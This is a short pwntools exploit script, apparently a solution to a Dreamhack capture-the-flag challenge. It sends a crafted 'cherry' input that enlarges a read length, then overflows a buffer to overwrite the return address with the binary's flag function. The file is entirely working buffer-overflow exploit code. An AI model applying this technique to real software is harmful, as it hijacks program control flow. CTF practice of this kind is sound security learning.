#! /usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./chall', checksec=False) 
cherry = b'cherry' + b'a'*6 + b'\x80'

r  = process(exe.path)
#r = remote('host3.dreamhack.games', 15931)
gdb.attach(r)
r.recvuntil(b'Menu: ')
r.sendline(cherry)

payload = b'a'*26 + p64(exe.sym['flag'])
r.recvuntil(b'Is it cherry?: ')
r.sendline(payload)
r.interactive()